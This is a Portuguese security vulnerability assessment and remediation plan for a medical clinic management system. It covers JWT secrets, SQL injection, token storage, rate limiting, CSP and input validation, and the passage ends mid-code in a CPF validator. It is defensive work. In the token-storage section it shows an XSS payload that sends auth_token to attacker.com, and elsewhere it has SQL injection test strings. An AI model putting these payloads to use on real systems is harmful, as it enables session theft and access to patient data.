# An√°lise de Vulnerabilidades de Seguran√ßa e Plano de A√ß√£o

**Data**: 2026-02-04  
**Vers√£o**: 1.0  
**Sistema**: Omni Care Software - Sistema de Gest√£o para Consult√≥rios M√©dicos

## üìã Sum√°rio Executivo

Este documento apresenta uma an√°lise abrangente das vulnerabilidades de seguran√ßa identificadas nas APIs backend (.NET 8) e no frontend (Angular 18+) do Omni Care Software, incluindo um plano de a√ß√£o detalhado para mitiga√ß√£o durante o desenvolvimento.

### Status Geral de Seguran√ßa

| Categoria | Status | Prioridade |
|-----------|--------|------------|
| **Autentica√ß√£o** | ‚ö†Ô∏è M√©dio | Alta |
| **Autoriza√ß√£o** | ‚úÖ Bom | M√©dia |
| **Criptografia** | ‚úÖ Bom | Baixa |
| **Valida√ß√£o de Entrada** | ‚ö†Ô∏è M√©dio | Alta |
| **Prote√ß√£o contra Inje√ß√£o** | ‚ö†Ô∏è M√©dio | Cr√≠tica |
| **Gerenciamento de Sess√£o** | ‚ö†Ô∏è M√©dio | Alta |
| **Prote√ß√£o de Dados Sens√≠veis** | ‚úÖ Bom | M√©dia |
| **Configura√ß√£o de Seguran√ßa** | ‚ö†Ô∏è M√©dio | Alta |
| **Logging e Monitoramento** | ‚ö†Ô∏è M√©dio | M√©dia |
| **Gerenciamento de Depend√™ncias** | ‚ùå Cr√≠tico | Cr√≠tica |

---

## üîç Metodologia de An√°lise

A an√°lise foi realizada atrav√©s de:

1. **Revis√£o de C√≥digo Est√°tica**: An√°lise manual de controllers, services, middlewares e componentes frontend
2. **An√°lise de Arquitetura**: Avalia√ß√£o dos padr√µes de seguran√ßa implementados
3. **Revis√£o de Configura√ß√µes**: Verifica√ß√£o de arquivos de configura√ß√£o (appsettings.json, environment.ts)
4. **An√°lise de Depend√™ncias**: Verifica√ß√£o de bibliotecas e pacotes utilizados
5. **Testes de Seguran√ßa**: Identifica√ß√£o de vulnerabilidades comuns do OWASP Top 10

---

## üèóÔ∏è Arquitetura do Sistema

### Backend (.NET 8)
- **Framework**: ASP.NET Core 8.0
- **Arquitetura**: Domain-Driven Design (DDD)
- **Banco de Dados**: PostgreSQL / SQL Server
- **ORM**: Entity Framework Core
- **Autentica√ß√£o**: JWT Bearer Tokens
- **Autoriza√ß√£o**: Claims-based + Permission system

### Frontend (Angular 18+)
- **Framework**: Angular 18+
- **Aplica√ß√µes**: 5 apps principais
  - medicwarehouse-app (Main clinic management)
  - patient-portal (Patient-facing PWA)
  - mw-system-admin (Admin dashboard)
  - mw-docs (Documentation)
  - mw-site (Marketing site)
- **Comunica√ß√£o**: HTTP REST APIs
- **Autentica√ß√£o**: JWT tokens em localStorage

---

## üö® Vulnerabilidades Cr√≠ticas

### 1. JWT Secret Key Hardcoded ou Inseguro

**Severidade**: üî¥ CR√çTICA  
**CWE**: CWE-798 (Use of Hard-coded Credentials)  
**OWASP**: A02:2021 - Cryptographic Failures

#### Descri√ß√£o
An√°lise do c√≥digo sugere que a chave secreta JWT pode estar hardcoded ou armazenada de forma insegura. O c√≥digo em `Program.cs` configura JWT authentication, mas a fonte da chave secreta n√£o est√° clara.

#### Localiza√ß√£o
```
src/MedicSoft.Api/Program.cs (linha ~200+)
appsettings.json
appsettings.Production.json
```

#### Impacto
- ‚ö†Ô∏è Qualquer pessoa com acesso ao c√≥digo pode gerar tokens JWT v√°lidos
- ‚ö†Ô∏è Comprometimento total da autentica√ß√£o do sistema
- ‚ö†Ô∏è Possibilidade de escala√ß√£o de privil√©gios e acesso n√£o autorizado
- ‚ö†Ô∏è Viola√ß√£o de dados de pacientes (LGPD)

#### C√≥digo Vulner√°vel Exemplo
```csharp
// ‚ùå N√ÉO FAZER
var key = Encoding.ASCII.GetBytes("my-secret-key-12345");

// ‚ùå TAMB√âM N√ÉO FAZER
var key = Encoding.ASCII.GetBytes(configuration["Jwt:Key"]); // Se armazenado em appsettings
```

#### Solu√ß√£o Recomendada
```csharp
// ‚úÖ FAZER - Usar vari√°veis de ambiente
var jwtKey = Environment.GetEnvironmentVariable("JWT_SECRET_KEY");
if (string.IsNullOrEmpty(jwtKey))
{
    throw new InvalidOperationException(
        "JWT_SECRET_KEY environment variable is not configured. " +
        "This is required for production deployment.");
}

var key = Encoding.ASCII.GetBytes(jwtKey);

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuerSigningKey = true,
            IssuerSigningKey = new SymmetricSecurityKey(key),
            ValidateIssuer = true,
            ValidIssuer = configuration["Jwt:Issuer"],
            ValidateAudience = true,
            ValidAudience = configuration["Jwt:Audience"],
            ValidateLifetime = true,
            ClockSkew = TimeSpan.FromMinutes(5)
        };
    });
```

#### Plano de A√ß√£o
1. **Imediato** (Dia 1):
   - Auditar onde a chave JWT est√° armazenada
   - Se hardcoded, remover imediatamente
   - Gerar nova chave forte (256 bits m√≠nimo)

2. **Curto Prazo** (Dias 2-3):
   - Configurar vari√°veis de ambiente em todos os ambientes
   - Atualizar documenta√ß√£o de deployment
   - Implementar valida√ß√£o de startup para garantir que a chave existe

3. **M√©dio Prazo** (Semana 1):
   - Migrar para Azure Key Vault / AWS Secrets Manager
   - Implementar rota√ß√£o autom√°tica de chaves
   - Configurar alertas para tentativas de uso de chaves antigas

4. **Longo Prazo** (M√™s 1):
   - Implementar sistema de m√∫ltiplas chaves com versionamento
   - Adicionar suporte para RS256 (asymmetric) em vez de HS256
   - Documentar procedimentos de rota√ß√£o de chaves

#### Valida√ß√£o
```bash
# Verificar que n√£o h√° secrets no c√≥digo
git grep -i "secret" --and --not -e "GetEnvironmentVariable"

# Testar que a aplica√ß√£o n√£o inicia sem a vari√°vel
unset JWT_SECRET_KEY
dotnet run # Deve falhar com mensagem clara
```

---

### 2. SQL Injection via Raw SQL Queries

**Severidade**: üî¥ CR√çTICA  
**CWE**: CWE-89 (SQL Injection)  
**OWASP**: A03:2021 - Injection

#### Descri√ß√£o
Poss√≠vel uso de concatena√ß√£o de strings ou string interpolation em queries SQL. O sistema possui `InputSanitizer.SanitizeSqlInput()`, o que sugere que pode haver locais onde raw SQL √© usado.

#### Localiza√ß√£o
```
src/MedicSoft.Repository/Repositories/*.cs
src/MedicSoft.CrossCutting/Security/InputSanitizer.cs (defesa secund√°ria)
```

#### Impacto
- ‚ö†Ô∏è Acesso n√£o autorizado a todos os dados do banco
- ‚ö†Ô∏è Modifica√ß√£o ou exclus√£o de dados cr√≠ticos
- ‚ö†Ô∏è Bypass completo de autentica√ß√£o e autoriza√ß√£o
- ‚ö†Ô∏è Vazamento de dados sens√≠veis de pacientes

#### Padr√µes Vulner√°veis a Procurar
```csharp
// ‚ùå VULNER√ÅVEL - String concatenation
var query = "SELECT * FROM Users WHERE Username = '" + username + "'";
context.Database.ExecuteSqlRaw(query);

// ‚ùå VULNER√ÅVEL - String interpolation
var query = $"SELECT * FROM Patients WHERE CPF = '{cpf}'";
await context.Database.ExecuteSqlRawAsync(query);

// ‚ùå VULNER√ÅVEL - FromSqlRaw com interpolation
var patients = await context.Patients
    .FromSqlRaw($"SELECT * FROM Patients WHERE Name LIKE '%{searchTerm}%'")
    .ToListAsync();
```

#### Solu√ß√£o Recomendada
```csharp
// ‚úÖ SEGURO - LINQ to Entities (prefer√≠vel)
var user = await context.Users
    .Where(u => u.Username == username)
    .FirstOrDefaultAsync();

// ‚úÖ SEGURO - FromSqlRaw com par√¢metros
// Nota: Aspas duplas (") s√£o espec√≠ficas do PostgreSQL
// Para SQL Server, usar colchetes [Patients] ou sem delimitadores
var patients = await context.Patients
    .FromSqlRaw(
        "SELECT * FROM \"Patients\" WHERE \"Name\" ILIKE {0}",
        $"%{searchTerm}%"
    )
    .ToListAsync();

// ‚úÖ SEGURO - ExecuteSqlRaw com par√¢metros
await context.Database.ExecuteSqlRawAsync(
    "UPDATE \"Appointments\" SET \"Status\" = {0} WHERE \"Id\" = {1}",
    status, appointmentId
);

// ‚úÖ SEGURO - Stored procedures com par√¢metros
var result = await context.Procedures
    .FromSqlRaw("CALL GetPatientHistory(@PatientId)", 
        new NpgsqlParameter("@PatientId", patientId))
    .ToListAsync();
```

#### Plano de A√ß√£o
1. **Imediato** (Dias 1-2):
   ```bash
   # Procurar por uso de m√©todos raw SQL
   grep -r "ExecuteSqlRaw\|FromSqlRaw\|ExecuteSqlCommand" src/
   
   # Procurar por concatena√ß√£o de strings em SQL
   grep -r '\$"SELECT\|"SELECT.*\+\|"INSERT.*\+' src/
   ```

2. **Curto Prazo** (Dias 3-5):
   - Auditar manualmente cada ocorr√™ncia encontrada
   - Refatorar para usar LINQ ou queries parametrizadas
   - Remover reliance em `InputSanitizer.SanitizeSqlInput()`

3. **M√©dio Prazo** (Semanas 1-2):
   - Implementar code analyzer customizado
   - Adicionar testes de SQL injection para endpoints cr√≠ticos
   - Configurar SonarQube rules para detectar padr√µes inseguros

4. **Longo Prazo** (M√™s 1):
   - Estabelecer policy: "No raw SQL without code review"
   - Criar stored procedures para opera√ß√µes complexas
   - Implementar read-only database user para queries de relat√≥rios

#### Teste de Valida√ß√£o
```csharp
[Fact]
public async Task Login_Should_Not_Be_Vulnerable_To_SQL_Injection()
{
    // Arrange
    var maliciousUsername = "admin'--";
    var maliciousPassword = "' OR '1'='1";
    
    // Act
    var result = await _authService.AuthenticateUserAsync(
        maliciousUsername, maliciousPassword, "tenant1");
    
    // Assert
    Assert.Null(result); // Should not authenticate
}
```

---

### 3. Armazenamento Inseguro de Tokens em localStorage

**Severidade**: üî¥ CR√çTICA  
**CWE**: CWE-522 (Insufficiently Protected Credentials)  
**OWASP**: A02:2021 - Cryptographic Failures

#### Descri√ß√£o
Tokens JWT s√£o armazenados em `localStorage`, tornando-os vulner√°veis a ataques XSS. Qualquer script malicioso executado na p√°gina pode roubar os tokens.

#### Localiza√ß√£o
```typescript
// frontend/medicwarehouse-app/src/app/services/auth.ts
private tokenKey = 'auth_token';
setToken(token: string): void {
    localStorage.setItem(this.tokenKey, token); // ‚ùå VULNER√ÅVEL
}

// frontend/mw-system-admin/src/app/services/auth.ts  
// frontend/patient-portal/src/app/services/auth.service.ts
// Mesmo padr√£o em todos os apps frontend
```

#### Impacto
- ‚ö†Ô∏è Tokens podem ser roubados via XSS
- ‚ö†Ô∏è Sess√µes permanecem ativas indefinidamente (n√£o expiram ao fechar navegador)
- ‚ö†Ô∏è Tokens n√£o podem ser facilmente revogados
- ‚ö†Ô∏è Vulner√°vel a malware que l√™ localStorage

#### Vetores de Ataque
```javascript
// Ataque XSS simples que rouba token
<img src=x onerror="
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'))
">

// Ou atrav√©s de biblioteca comprometida
import tracker from 'malicious-package';
tracker.send(localStorage.getItem('auth_token'));
```

#### Solu√ß√£o Recomendada

**Op√ß√£o 1: Cookies HttpOnly (RECOMENDADO)**

Backend:
```csharp
// AuthController.cs
[HttpPost("login")]
public async Task<ActionResult<LoginResponse>> Login([FromBody] LoginRequest request)
{
    var user = await _authService.AuthenticateUserAsync(/*...*/);
    var token = _jwtTokenService.GenerateToken(user);
    var refreshToken = _refreshTokenService.GenerateRefreshToken(user.Id);
    
    // Enviar token como cookie HttpOnly
    Response.Cookies.Append("auth_token", token, new CookieOptions
    {
        HttpOnly = true,      // JavaScript n√£o pode acessar
        Secure = true,        // Apenas HTTPS
        SameSite = SameSiteMode.Strict, // Prote√ß√£o CSRF
        MaxAge = TimeSpan.FromMinutes(15), // Curta dura√ß√£o
        Path = "/api"
    });
    
    Response.Cookies.Append("refresh_token", refreshToken, new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Strict,
        MaxAge = TimeSpan.FromDays(7),
        Path = "/api/auth/refresh"
    });
    
    // Retornar apenas informa√ß√µes n√£o-sens√≠veis
    return Ok(new
    {
        username = user.Username,
        role = user.Role,
        // N√ÉO enviar token no body
    });
}
```

Frontend:
```typescript
// auth.service.ts
login(credentials: LoginRequest): Observable<AuthResponse> {
    return this.http.post<AuthResponse>(
        `${this.apiUrl}/auth/login`,
        credentials,
        { withCredentials: true } // Importante: enviar cookies
    ).pipe(
        tap(response => {
            // Token est√° em cookie, n√£o precisa armazenar
            this.setUserInfo(response);
            this.isAuthenticated.set(true);
        })
    );
}

// auth.interceptor.ts - N√ÉO precisa adicionar header manualmente
intercept(req: HttpRequest<any>, next: HttpHandler) {
    // Cookies s√£o enviados automaticamente com withCredentials: true
    const cloned = req.clone({
        withCredentials: true
    });
    return next.handle(cloned);
}
```

**Op√ß√£o 2: sessionStorage (MELHOR QUE localStorage, mas n√£o ideal)**
```typescript
// Usar sessionStorage ao inv√©s de localStorage
private storage = sessionStorage; // Limpa ao fechar aba

setToken(token: string): void {
    this.storage.setItem(this.tokenKey, token);
}
```

#### Plano de A√ß√£o
1. **Imediato** (Dias 1-3):
   - Implementar cookies HttpOnly no backend
   - Testar em ambiente de desenvolvimento
   - Documentar mudan√ßas para o time frontend

2. **Curto Prazo** (Semana 1):
   - Atualizar todos os apps frontend para usar cookies
   - Implementar refresh token flow
   - Adicionar endpoint `/auth/refresh`
   - Remover `auth_token` de localStorage

3. **M√©dio Prazo** (Semanas 2-3):
   - Implementar token rotation
   - Adicionar revoga√ß√£o de tokens
   - Configurar Redis/cache distribu√≠do para token blacklist
   - Implementar "Logout de todos os dispositivos"

4. **Longo Prazo** (M√™s 1):
   - Implementar fingerprinting de dispositivo
   - Adicionar notifica√ß√µes de novo login
   - Implementar sess√µes com nome (ex: "Chrome no Windows")
   - Dashboard de sess√µes ativas

#### Valida√ß√£o
```typescript
// Teste: Verificar que tokens n√£o est√£o em localStorage
it('should not store tokens in localStorage', () => {
    authService.login(credentials).subscribe();
    expect(localStorage.getItem('auth_token')).toBeNull();
});

// Teste: Verificar que cookies s√£o HttpOnly
it('should set httpOnly cookies', async () => {
    const response = await request(app)
        .post('/api/auth/login')
        .send(credentials);
    
    const cookie = response.headers['set-cookie'][0];
    expect(cookie).toContain('HttpOnly');
    expect(cookie).toContain('Secure');
    expect(cookie).toContain('SameSite=Strict');
});
```

---

### 4. Rate Limiting Insuficiente em Endpoints Cr√≠ticos

**Severidade**: üî¥ CR√çTICA  
**CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
**OWASP**: A07:2021 - Identification and Authentication Failures

#### Descri√ß√£o
Sistema tem rate limiting b√°sico (`10 requests/60s`), mas n√£o √© espec√≠fico para endpoints cr√≠ticos como login. Permite ataques de brute force.

####  Localiza√ß√£o
```csharp
// src/MedicSoft.Api/Program.cs
builder.Services.AddRateLimiter(options =>
{
    options.AddFixedWindowLimiter("fixed", options =>
    {
        options.PermitLimit = 10;  // Muito permissivo para login
        options.Window = TimeSpan.FromSeconds(60);
    });
});
```

#### Impacto
- ‚ö†Ô∏è Ataques de for√ßa bruta em credenciais (ex: testar 10 senhas por minuto = 600/hora)
- ‚ö†Ô∏è Credential stuffing attacks
- ‚ö†Ô∏è DoS (Denial of Service) atrav√©s de requisi√ß√µes excessivas
- ‚ö†Ô∏è Exaust√£o de recursos do servidor

#### Solu√ß√£o Recomendada
```csharp
// Program.cs - Configura√ß√£o abrangente
builder.Services.AddRateLimiter(options =>
{
    // 1. Login endpoints - Muito restritivo
    options.AddFixedWindowLimiter("login", opt =>
    {
        opt.PermitLimit = 5;  // 5 tentativas
        opt.Window = TimeSpan.FromMinutes(15);  // Por 15 minutos
        opt.QueueLimit = 0;  // Sem fila
    });
    
    // 2. Sensitive operations (password reset, 2FA)
    options.AddFixedWindowLimiter("sensitive", opt =>
    {
        opt.PermitLimit = 3;
        opt.Window = TimeSpan.FromMinutes(10);
        opt.QueueLimit = 0;
    });
    
    // 3. API endpoints gerais
    options.AddFixedWindowLimiter("api", opt =>
    {
        opt.PermitLimit = 100;
        opt.Window = TimeSpan.FromMinutes(1);
    });
    
    // 4. Rate limiting por IP para proteger contra distributed attacks
    options.AddPolicy("perIP", context =>
    {
        var ipAddress = context.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        var endpoint = context.Request.Path.ToString();
        
        // Diferentes limits por tipo de endpoint
        var (permitLimit, window) = endpoint switch
        {
            var p when p.StartsWith("/api/auth/login") => (5, TimeSpan.FromMinutes(15)),
            var p when p.StartsWith("/api/auth/") => (10, TimeSpan.FromMinutes(5)),
            _ => (100, TimeSpan.FromMinutes(1))
        };
        
        return RateLimitPartition.GetFixedWindowLimiter(
            $"{ipAddress}:{endpoint}", 
            _ => new FixedWindowRateLimiterOptions
            {
                PermitLimit = permitLimit,
                Window = window,
                QueueLimit = 0
            });
    });
    
    // 5. Sliding window para suavizar picos
    options.AddSlidingWindowLimiter("sliding", opt =>
    {
        opt.PermitLimit = 100;
        opt.Window = TimeSpan.FromMinutes(1);
        opt.SegmentsPerWindow = 4;  // Janela deslizante de 15s
    });
});

// Aplicar nos controllers
[ApiController]
[Route("api/[controller]")]
public class AuthController : ControllerBase
{
    [HttpPost("login")]
    [EnableRateLimiting("login")]  // Rate limit espec√≠fico
    public async Task<IActionResult> Login([FromBody] LoginRequest request)
    {
        // Implementar tamb√©m account lockout ap√≥s N falhas
        var failedAttempts = await _authService.GetFailedLoginAttempts(request.Username);
        if (failedAttempts >= 5)
        {
            _logger.LogWarning("Account locked: {Username}", request.Username);
            return StatusCode(429, new {
                message = "Conta temporariamente bloqueada devido a m√∫ltiplas tentativas de login. Tente novamente em 15 minutos.",
                lockoutEnd = DateTime.UtcNow.AddMinutes(15)
            });
        }
        
        var user = await _authService.AuthenticateUserAsync(/*...*/);
        if (user == null)
        {
            await _authService.RecordFailedLoginAttempt(request.Username);
            return Unauthorized(new { message = "Usu√°rio ou senha incorretos." });
        }
        
        await _authService.ClearFailedLoginAttempts(request.Username);
        // ... resto do c√≥digo
    }
}
```

#### Implementar Tracking de Tentativas Falhas
```csharp
// Services/AuthService.cs
public class AuthService : IAuthService
{
    private readonly IDistributedCache _cache;
    
    public async Task RecordFailedLoginAttempt(string username)
    {
        var key = $"failed_login:{username}";
        var attempts = await GetFailedLoginAttempts(username);
        attempts++;
        
        await _cache.SetStringAsync(key, attempts.ToString(), new DistributedCacheEntryOptions
        {
            AbsoluteExpirationRelativeToNow = TimeSpan.FromMinutes(15)
        });
        
        // Log para an√°lise de seguran√ßa
        _logger.LogWarning("Failed login attempt {Attempts} for user {Username}", 
            attempts, username);
        
        // Alertar se muitas tentativas
        if (attempts >= 5)
        {
            await _alertService.SendSecurityAlert($"Multiple failed login attempts for {username}");
        }
    }
    
    public async Task<int> GetFailedLoginAttempts(string username)
    {
        var key = $"failed_login:{username}";
        var value = await _cache.GetStringAsync(key);
        return int.TryParse(value, out var attempts) ? attempts : 0;
    }
    
    public async Task ClearFailedLoginAttempts(string username)
    {
        var key = $"failed_login:{username}";
        await _cache.RemoveAsync(key);
    }
}
```

#### Adicionar CAPTCHA ap√≥s N Falhas
```typescript
// Frontend - auth.service.ts
login(credentials: LoginRequest): Observable<AuthResponse> {
    return this.http.post<AuthResponse>(`${this.apiUrl}/auth/login`, credentials)
        .pipe(
            catchError((error: HttpErrorResponse) => {
                if (error.status === 429) {
                    // Requer CAPTCHA
                    return this.showCaptchaAndRetry(credentials);
                }
                return throwError(() => error);
            })
        );
}

private showCaptchaAndRetry(credentials: LoginRequest): Observable<AuthResponse> {
    return from(this.captchaService.execute()).pipe(
        switchMap(captchaToken => {
            return this.http.post<AuthResponse>(
                `${this.apiUrl}/auth/login`,
                { ...credentials, captchaToken }
            );
        })
    );
}
```

#### Plano de A√ß√£o
1. **Imediato** (Dias 1-2):
   - Implementar rate limiting espec√≠fico para `/auth/login`
   - Adicionar tracking de tentativas falhas
   - Configurar alertas de seguran√ßa

2. **Curto Prazo** (Dias 3-5):
   - Implementar account lockout tempor√°rio
   - Adicionar rate limiting por IP
   - Testar diferentes cen√°rios de ataque

3. **M√©dio Prazo** (Semanas 1-2):
   - Integrar Google reCAPTCHA v3
   - Implementar an√°lise de comportamento
   - Dashboard de tentativas de login

4. **Longo Prazo** (M√™s 1):
   - Implementar machine learning para detectar padr√µes an√¥malos
   - Sistema de reputa√ß√£o de IPs
   - Integra√ß√£o com threat intelligence feeds

#### Teste de Valida√ß√£o
```csharp
[Fact]
public async Task Login_Should_Be_Rate_Limited()
{
    // Arrange
    var credentials = new LoginRequest { Username = "test", Password = "wrong" };
    
    // Act - Tentar login 6 vezes
    for (int i = 0; i < 6; i++)
    {
        var response = await _client.PostAsJsonAsync("/api/auth/login", credentials);
        
        if (i < 5)
        {
            Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
        }
        else
        {
            Assert.Equal(HttpStatusCode.TooManyRequests, response.StatusCode);
        }
    }
}
```

---

## ‚ö†Ô∏è Vulnerabilidades de Alta Severidade

### 5. Content Security Policy (CSP) Permissiva com unsafe-inline e unsafe-eval

**Severidade**: üü† ALTA  
**CWE**: CWE-1021 (Improper Restriction of Rendered UI Layers)  
**OWASP**: A05:2021 - Security Misconfiguration

#### Descri√ß√£o
A CSP atual permite `'unsafe-inline'` e `'unsafe-eval'`, o que enfraquece significativamente a prote√ß√£o contra XSS. Isso essencialmente desabilita grande parte da prote√ß√£o que a CSP deveria fornecer.

#### Localiza√ß√£o
```csharp
// src/MedicSoft.CrossCutting/Security/SecurityHeadersMiddleware.cs
var csp = "default-src 'self'; " +
          "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " +  // ‚ùå PERIGOSO
          "style-src 'self' 'unsafe-inline'; " +                  // ‚ùå PERIGOSO  
          "img-src 'self' data: https:; " +
          "font-src 'self' data:; " +
          "connect-src 'self'; " +
          "frame-ancestors 'none';";
```

#### Impacto
- ‚ö†Ô∏è XSS attacks n√£o s√£o efetivamente mitigados
- ‚ö†Ô∏è Scripts inline maliciosos podem ser executados
- ‚ö†Ô∏è `eval()` e similares podem ser usados para exploits
- ‚ö†Ô∏è Reduz drasticamente a efic√°cia da CSP

#### Por que 'unsafe-inline' e 'unsafe-eval' s√£o perigosos?

1. **'unsafe-inline'**: Permite qualquer script inline
```html
<!-- Todos esses scripts ser√£o executados -->
<script>maliciousCode()</script>
<div onclick="maliciousCode()">Click me</div>
<img src=x onerror="maliciousCode()">
```

2. **'unsafe-eval'**: Permite `eval()` e `Function()`
```javascript
// C√≥digo vulner√°vel que pode ser explorado
const userInput = params.get('data');
eval(userInput);  // Se CSP permite unsafe-eval, isso funciona!
```

#### Solu√ß√£o Recomendada

**Implementar CSP com Nonces**

Backend - Middleware:
```csharp
public class SecurityHeadersMiddleware
{
    private readonly RequestDelegate _next;
    
    public async Task InvokeAsync(HttpContext context)
    {
        // Gerar nonce √∫nico por request
        var nonce = GenerateNonce();
        context.Items["csp-nonce"] = nonce;
        
        // Configura√ß√µes de API permitidas (para connect-src)
        var apiDomains = "https://api.medicwarehouse.com https://*.medicwarehouse.com";
        
        // CSP robusta com nonce
        var csp = $"default-src 'self'; " +
                  $"script-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net; " +
                  $"style-src 'self' 'nonce-{nonce}'; " +
                  $"img-src 'self' data: https: blob:; " +
                  $"font-src 'self' data:; " +
                  $"connect-src 'self' {apiDomains}; " +
                  $"frame-src 'none'; " +
                  $"frame-ancestors 'none'; " +
                  $"base-uri 'self'; " +
                  $"form-action 'self'; " +
                  $"object-src 'none'; " +
                  $"upgrade-insecure-requests; " +
                  $"block-all-mixed-content;";
        
        context.Response.Headers.Add("Content-Security-Policy", csp);
        
        // Tamb√©m adicionar modo report-only para monitoramento
        var cspReport = csp + " report-uri /api/csp-violations";
        context.Response.Headers.Add("Content-Security-Policy-Report-Only", cspReport);
        
        await _next(context);
    }
    
    private string GenerateNonce()
    {
        var bytes = new byte[16];
        using (var rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(bytes);
        }
        return Convert.ToBase64String(bytes);
    }
}
```

**Adicionar Nonce nas Views (Razor Pages)**
```html
<!-- _Layout.cshtml -->
<!DOCTYPE html>
<html>
<head>
    <script nonce="@Context.Items["csp-nonce"]">
        // Script inline permitido com nonce
        console.log('Safe inline script');
    </script>
    
    <style nonce="@Context.Items["csp-nonce"]">
        /* Estilos inline permitidos com nonce */
        .safe-class { color: blue; }
    </style>
</head>
<body>
    <!-- Conte√∫do -->
</body>
</html>
```

**Refatorar Scripts Inline no Angular**

Antes (Vulner√°vel):
```html
<!-- ‚ùå Event handler inline -->
<button (click)="deletePatient()" onclick="alert('Deleted')">Delete</button>

<!-- ‚ùå Script inline -->
<script>
    window.config = { apiUrl: '...' };
</script>
```

Depois (Seguro):
```html
<!-- ‚úÖ Usar Angular event bindings -->
<button (click)="deletePatient()">Delete</button>

<!-- ‚úÖ Mover config para arquivo separado -->
<script src="/config.js" nonce="{{nonce}}"></script>

<!-- OU injetar via Angular -->
<!-- environment.ts -->
export const environment = {
    apiUrl: 'https://api.medicwarehouse.com'
};
```

#### Endpoint para Reportar Viola√ß√µes
```csharp
[ApiController]
[Route("api/csp-violations")]
public class CspViolationsController : ControllerBase
{
    private readonly ILogger<CspViolationsController> _logger;
    
    [HttpPost]
    [AllowAnonymous]  // Browsers precisam enviar reports
    public IActionResult ReportViolation([FromBody] CspViolationReport report)
    {
        _logger.LogWarning("CSP Violation: {Violation}", JsonSerializer.Serialize(report));
        
        // Alertar se muitas viola√ß√µes
        // Pode indicar tentativa de ataque ou erro de configura√ß√£o
        
        return NoContent();
    }
}

public class CspViolationReport
{
    [JsonPropertyName("csp-report")]
    public CspReport CspReport { get; set; }
}

public class CspReport
{
    [JsonPropertyName("document-uri")]
    public string DocumentUri { get; set; }
    
    [JsonPropertyName("violated-directive")]
    public string ViolatedDirective { get; set; }
    
    [JsonPropertyName("blocked-uri")]
    public string BlockedUri { get; set; }
    
    // ... outros campos
}
```

#### Plano de A√ß√£o
1. **Imediato** (Dias 1-2):
   - Implementar gera√ß√£o de nonces
   - Adicionar CSP em modo report-only para testing
   - Coletar violations por 24-48h

2. **Curto Prazo** (Dias 3-5):
   - Analisar violations reportadas
   - Identificar scripts/estilos inline que precisam ser movidos
   - Refatorar c√≥digo problem√°tico

3. **M√©dio Prazo** (Semanas 1-2):
   - Ativar CSP em modo enforce (n√£o apenas report)
   - Remover 'unsafe-inline' e 'unsafe-eval'
   - Adicionar nonces onde necess√°rio
   - Mover scripts inline para arquivos externos

4. **Longo Prazo** (M√™s 1):
   - Implementar subresource integrity (SRI) para CDN resources
   - Configurar CSP espec√≠fica por p√°gina/rota
   - Automating nonce generation em build time
   - Documentar pr√°ticas de CSP para equipe

#### Teste de Valida√ß√£o
```typescript
// E2E test
it('should block inline scripts without nonce', async () => {
    // Tentar injetar script inline
    await page.evaluate(() => {
        const script = document.createElement('script');
        script.textContent = 'window.hacked = true';
        document.body.appendChild(script);
    });
    
    // Verificar que n√£o executou
    const hacked = await page.evaluate(() => window.hacked);
    expect(hacked).toBeUndefined();
});
```

---


### 6. Valida√ß√£o de Entrada Insuficiente e Inconsistente

**Severidade**: üü† ALTA  
**CWE**: CWE-20 (Improper Input Validation)  
**OWASP**: A03:2021 - Injection

#### Descri√ß√£o
Valida√ß√£o de entrada no frontend n√£o √© consistente em todos os formul√°rios. O backend depende do `[Required]` e atributos b√°sicos, mas falta valida√ß√£o robusta de formato, tamanho e conte√∫do.

#### Impacto
- ‚ö†Ô∏è Permite dados malformados no banco de dados
- ‚ö†Ô∏è Possibilita ataques de inje√ß√£o (XSS, SQL)
- ‚ö†Ô∏è DoS atrav√©s de inputs muito grandes
- ‚ö†Ô∏è Problemas de integridade de dados

#### Solu√ß√£o Recomendada

**Backend - DTOs com Valida√ß√£o Completa**:
```csharp
public class CreatePatientDto
{
    [Required(ErrorMessage = "Nome √© obrigat√≥rio")]
    [StringLength(200, MinimumLength = 3, ErrorMessage = "Nome deve ter entre 3 e 200 caracteres")]
    [RegularExpression(@"^[a-zA-Z√Ä-√ø\s'-]+$", ErrorMessage = "Nome cont√©m caracteres inv√°lidos")]
    public string Name { get; set; }
    
    [Required(ErrorMessage = "CPF √© obrigat√≥rio")]
    [RegularExpression(@"^\d{3}\.\d{3}\.\d{3}-\d{2}$", ErrorMessage = "CPF inv√°lido")]
    [CustomValidation(typeof(CpfValidator), nameof(CpfValidator.Validate))]
    public string CPF { get; set; }
    
    [Required]
    [EmailAddress(ErrorMessage = "Email inv√°lido")]
    [StringLength(100)]
    public string Email { get; set; }
    
    [Phone(ErrorMessage = "Telefone inv√°lido")]
    [RegularExpression(@"^\(\d{2}\)\s\d{4,5}-\d{4}$")]
    public string? Phone { get; set; }
    
    [StringLength(5000, ErrorMessage = "Notas n√£o podem exceder 5000 caracteres")]
    [NoHtml] // Custom validator para prevenir HTML
    public string? MedicalHistory { get; set; }
}

// Custom validator
public class NoHtmlAttribute : ValidationAttribute
{
    protected override ValidationResult IsValid(object value, ValidationContext context)
    {
        if (value == null) return ValidationResult.Success;
        
        var input = value.ToString();
        if (Regex.IsMatch(input, @"<[^>]*>"))
        {
            return new ValidationResult("HTML n√£o √© permitido neste campo");
        }
        
        return ValidationResult.Success;
    }
}
```

**Frontend - Validadores Customizados**:
```typescript
// validators/custom-validators.ts
export class CustomValidators {
  static cpf(control: AbstractControl): ValidationErrors | null {
    if (!control.value) return null;
    
    const cpf = control.value.replace(/\D/g, '');
    
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) {
      return { cpf: { message: 'CPF inv√°lido' } };
    }
    
    // Valida√ß√£o com d√≠gitos verificadores
    let sum = 0;
    for (let i = 0; i < 9; i++) {
      sum += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let digit = 11 - (sum % 11);
    if (digit > 9) digit = 0;
    if (digit !== parseInt(cpf.charAt(9))) {
